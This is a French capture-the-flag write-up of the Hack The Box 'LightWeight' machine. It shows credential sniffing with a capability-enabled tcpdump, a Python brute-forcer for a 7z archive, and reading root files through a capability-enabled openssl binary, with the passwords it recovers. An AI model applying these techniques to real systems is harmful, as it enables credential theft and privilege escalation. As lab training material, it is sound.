# LightWeight writeups by Seyptoo.

[![forthebadge made-with-python](http://image.noelshack.com/fichiers/2018/52/7/1546173584-capture-du-2018-12-30-13-39-28.png)](https://hackthebox.eu/)

[![forthebadge made-with-python](http://image.noelshack.com/fichiers/2018/52/7/1546159641-capture-du-2018-12-30-09-47-09.png)](https://hackthebox.eu/)

Informations
----
    Ip :  10.10.10.119      Created by : 0xEA31
    Level : Not too easy    Base Points : 30
    
Nmap Scan
----
    Starting Nmap 7.01 ( https://nmap.org ) at 2018-12-30 09:50 CET
    Nmap scan report for 10.10.10.119
    Host is up (0.054s latency).
    Not shown: 997 filtered ports
    PORT    STATE SERVICE VERSION
    22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
    |_  256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
    80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
    |_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
    |_http-title: Lightweight slider evaluation page - slendr
    389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
    | ssl-cert: Subject: commonName=lightweight.htb
    | Not valid before: 2018-06-09T13:32:51
    |_Not valid after:  2019-06-09T13:32:51
    |_ssl-date: TLS randomness does not represent time

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 39.45 seconds
    
Parfaits nous avons 3 ports, le SSH, le HTTP, et enfin pour l'active directory le protocole LDAP.
Nous allons énumérer les services ouverts.

HTTP
----

Comme on peut le voir, nous devons nous connecter avec notre adresse IP comme username et mot de passe pour pouvoir accéder au serveur SSH. (Petite précision si vous tentez de FUZZ le serveur HTTP vous serez bannie 5 minutes.)

[![forthebadge made-with-python](http://image.noelshack.com/fichiers/2018/52/7/1546159986-capture-du-2018-12-30-09-52-53.png)](https://hackthebox.eu/)

SSH
----
Parfaits nous sommes connectés au serveur SSH mais pas en tant qu'utilisateurs. L'username et le mot de passe sont l'adresse IP de l'interface **tun0** très important.

    root@seyptoo-Aspire-E5-721:~/htb/writeup/LightWeight# ssh 10.10.10.119 -l 10.10.12.232
    10.10.12.232@10.10.10.119's password: 
    [10.10.12.232@lightweight ~]$ 

> L'options **-l** pour **login_name**. Le nom d'utilisateur ou quoi.

Nous allons simplement voir les utilisateurs dans le serveur avec la commande **awk**.

    awk -F: '{print $1,$7}' /etc/passwd|grep '/bin/bash'
    root /bin/bash
    ldapuser1 /bin/bash
    ldapuser2 /bin/bash
    10.10.12.232 /bin/bash
    
Parfait comme nous pouvons le voir il y'a 4 utilisateurs, **root**,**ldapuser1**,**ldapuser2** et enfin l'utilisateur **10.10.12.232**

**-F:** (Permet de couper c'est l'équivalent de la fonction split sur Python.) <br />
**'{print $1,$7}'** (Permet d'afficher la valeur numéro 1 et le numéro 7.) <br />
**/etc/passwd** (Le fichier.) <br />
**grep '/bin/bash'** (La commande grep permet de chercher une chaîne de caractère.)

Les capabilities sous Linux
----
Après avoir cherché pendant des heures j'ai enfin trouvé quelque chose de très intéressant, c'est les **capabilities**. Les capabilities ça peut être très dangereux pour des raisons assez spécifiques.

Les capabilities :
La gestion des capabilities est un mécanisme de sécurité du noyau Linux concourant à assurer un confinement d’exécution des applications s’exécutant sur le système en affinant les possibilités d'appliquer le principe du moindre privilège.

Pour chercher les fichiers :

    [10.10.12.232@lightweight ~]$ getcap -r / 2>/dev/null
    /usr/bin/ping = cap_net_admin,cap_net_raw+p
    /usr/sbin/mtr = cap_net_raw+ep
    /usr/sbin/suexec = cap_setgid,cap_setuid+ep
    /usr/sbin/arping = cap_net_raw+p
    /usr/sbin/clockdiff = cap_net_raw+p
    /usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
    [10.10.12.232@lightweight ~]$ 
    
Nous avons plusieurs programmes, on va se concentrer sur le programme tcpdump.

    [10.10.12.232@lightweight ~]$ ls -l /usr/sbin/tcpdump
    -rwxr-xr-x. 1 root root 942304 11 avril  2018 /usr/sbin/tcpdump
    [10.10.12.232@lightweight ~]$ 
    
TCPDUMP
----
Nous allons essayer de capturer les données du protocole LDAP avec la commande tcpdump et d'exécuter toutes les pages sur le serveur HTTP.

    [10.10.12.232@lightweight ~]$ tcpdump -i lo -nnXSs 0 'port 389'
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
    
Après avoir tapé la commande vous devez obligatoirement allez sur le serveur HTTP est d'exécuter toutes les pages le plus important **status.php**.

	0x0000:  4500 008f 3c3f 4000 4006 d528 0a0a 0a77  E...<?@.@..(...w
	0x0010:  0a0a 0a77 ad98 0185 83a1 cdb7 c84a 7ff5  ...w.........J..
	0x0020:  8018 02ab 2983 0000 0101 080a 003f f18c  ....)........?..
	0x0030:  003f f18b 3059 0201 0160 5402 0103 042d  .?..0Y...`T....-
	0x0040:  7569 643d 6c64 6170 7573 6572 322c 6f75  uid=ldapuser2,ou
	0x0050:  3d50 656f 706c 652c 6463 3d6c 6967 6874  =People,dc=light
	0x0060:  7765 6967 6874 2c64 633d 6874 6280 2038  weight,dc=htb..8
	0x0070:  6263 3832 3531 3333 3261 6265 3164 3766  bc8251332abe1d7f
	0x0080:  3130 3564 3365 3533 6164 3339 6163 32    105d3e53ad39ac2
    
Parfaits nous avons trouvé le mot de passe grâce à TCPDUMP nous avons pour de bon trouvé le mot de passe nous devons nous connecter avec la commande **su**.

    [10.10.12.232@lightweight ~]$ su - ldapuser2
    Mot de passe : 
    Dernière connexion : dimanche 30 décembre 2018 à 08:38:47 GMT sur pts/1
    [ldapuser2@lightweight ~]$ 
    
> Username : ldapuser2 <br />
> Password : 8bc8251332abe1d7f105d3e53ad39ac2

Parfaits nous sommes connecté.

    [ldapuser2@lightweight ~]$ ls
    backup.7z  OpenLDAP-Admin-Guide.pdf  OpenLdap.pdf  user.txt
    [ldapuser2@lightweight ~]$ wc -c user.txt 
    33 user.txt
    [ldapuser2@lightweight ~]$

Comme vous pouvez le voir il y a un fichier backup nous allons essayer de le transférer vers notre machine physique avec la commande **scp**.

    [ldapuser2@lightweight ~]$ scp -r -p $HOME/backup.7z seyptoo@10.10.12.232:/home/seyptoo/Bureau
    The authenticity of host '10.10.12.232 (10.10.12.232)' can't be established.
    ECDSA key fingerprint is SHA256:4ycMzm1pTioJxy5Bc7ALoE3W6QCRow3C0LSnbSmsMzo.
    ECDSA key fingerprint is MD5:3e:3c:10:13:79:db:36:76:a5:85:b5:8e:3b:ce:08:98.
    Are you sure you want to continue connecting (yes/no)? yes
    Warning: Permanently added '10.10.12.232' (ECDSA) to the list of known hosts.
    seyptoo@10.10.12.232's password: 
    backup.7z                                                                                                                       100% 3411    56.4KB/s   00:00    
    [ldapuser2@lightweight ~]$
    
Parfait le fichier a été transférer avec succès ! C'est un fichier 7z nous devons extraire le fichier avec la commande **7z**.

    root@seyptoo-Aspire-E5-721:/home/seyptoo/Bureau# 7z x backup.7z 

    7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
    p7zip Version 9.20 (locale=fr_FR.UTF-8,Utf16=on,HugeFiles=on,4 CPUs)

    Processing archive: backup.7z


    Enter password (will not be echoed) :
    
Merde le fichier est protégé par un mot de passe, j'ai crée un programme en Python exprès pour ça ! :D

    #coding:utf-8

    import sys
    import os as subprocessing
    import Queue
    import threading
    import optparse

    class SevenZipIncorrect(Exception):
        def __init__(self, error_zip):
            self.error_zip = error_zip

    class SevenZip(threading.Thread):
        def __init__(self, threads=35, command=None):
            threading.Thread.__init__(self)
            # System of Threads is present
            self.threads_tds = threads
            self.command_tds = command

            self.argument_on = sys.argv[1]
            self.argument_wd = sys.argv[2]

        def ExtensionModel(self, q):
            if(self.argument_on.endswith(".7z") == True):
                while True:
                    BertModel = q
                    BertModel = BertModel.get()
                    # Execution command for bruteforce ! :D
                    self.command_tds = ("7z x -p%s %s -aoa >/dev/null" %(BertModel, self.argument_on))
                    output_status_ts = subprocessing.system(self.command_tds)
                    # Starting bruteforce ! :D
                    if(output_status_ts == 0):
                        print "\n[+] Password cracked with success : %s\n" %(BertModel)
                        sys.exit(1)
                    else: # If password is not cracked.
                        print "[-] Password not cracked : %s" %(BertModel)

            else: # exceptions error
                raise SevenZipIncorrect("File is extensions incorrect")

        def run(self):
            q = Queue.Queue()
            with open(self.argument_wd, "r") as BertModel:
                for Queue_Reverse in BertModel:
                    q.put(Queue_Reverse.rstrip("\n\r"))
                self.ExtensionModel(q)

            for i in range(int(self.threads_tds)):
                wrapper = threading.Thread(target=self.ExtensionModel, args=(i, q))
                wrapper.setDaemon(True)
                wrapper.start()
                wrapper.join(600)

            q.join()

    if __name__ == "__main__":
        Algorithm = SevenZip()
        Algorithm.start()

Si vous avez des problèmes d'indentations vous avez juste à aller dans ma page Github et il y'a une repositories qui se nomme 7z-BruteForce vous avez juste à git clone ça ! ;)

	root@seyptoo-Aspire-E5-721:/home/seyptoo/Bureau# python params.py backup.7z /usr/share/wordlist/directory-list-2.3-medium.txt

Pour la liste je vous conseille d'utiliser rockyou.txt. Personnellement le bruteforce a pris seulement environ 10 minutes.

	[-] Password not cracked : help
	[-] Password not cracked : events
	[-] Password not cracked : archive
	[-] Password not cracked : 02
	[-] Password not cracked : register
	[-] Password not cracked : en
	[-] Password not cracked : forum
	[-] Password not cracked : software
	[-] Password not cracked : downloads
	[-] Password not cracked : 3

	[+] Password cracked with success : delete

Parfait nous avons cracker le mot de passe. Le mot de passe est **delete** donc vous pouvez extraires les fichiers backup. Si nous regardons le fichier **status.php**.

	root@seyptoo-Aspire-E5-721:/home/seyptoo/Bureau# cat status.php|grep -e 'username' -e 'password'
	$username = 'ldapuser1';
	$password = 'f3ca9d298a553da117442deeb6fa932d';
	if ($bind=ldap_bind($ds, $dn, $password)) {

Parfait nous avons trouver le mot de passe pour accéder à l'utilisateur **ldapuser1**. On se connecte avec la commande **su**.

	[10.10.12.232@lightweight ~]$ su - ldapuser1
	Mot de passe : 
	Dernière connexion : dimanche 30 décembre 2018 à 09:11:32 GMT sur pts/1
	[ldapuser1@lightweight ~]$ 

PrivEsc
----
Maintenant nous passons au root. Le root n'est pas très compliqué mais je n'ai pas trouvé de solution pour avoir un shell root j'ai essayé plusieurs choses mais sans succès.

Nous allons reutiliser la commande **getcap**.

	[ldapuser1@lightweight ~]$ getcap -r / 2>/dev/null
	/usr/bin/ping = cap_net_admin,cap_net_raw+p
	/usr/sbin/mtr = cap_net_raw+ep
	/usr/sbin/suexec = cap_setgid,cap_setuid+ep
	/usr/sbin/arping = cap_net_raw+p
	/usr/sbin/clockdiff = cap_net_raw+p
	/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
	/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep
	/home/ldapuser1/openssl = ep

Comme vous pouvez le voir il y'a un fichier qui se nomme openssl nous avons juste à lire le fichier root.txt avec la commande openssl.

	[ldapuser1@lightweight ~]$ /home/ldapuser1/openssl enc -in /root/root.txt -out /tmp/password.txt
	[ldapuser1@lightweight ~]$ wc -c /tmp/password.txt 
	33 /tmp/password.txt
	[ldapuser1@lightweight ~]$

![frustrated-computer-baboon](https://media.giphy.com/media/1tHzw9PZCB3gY/giphy.gif)

Parfait nous avons trouver le root. C'étais ma box préférer n'hésiter pas à mettre un star dans ma repo ça me feras grave plaisir ! :D


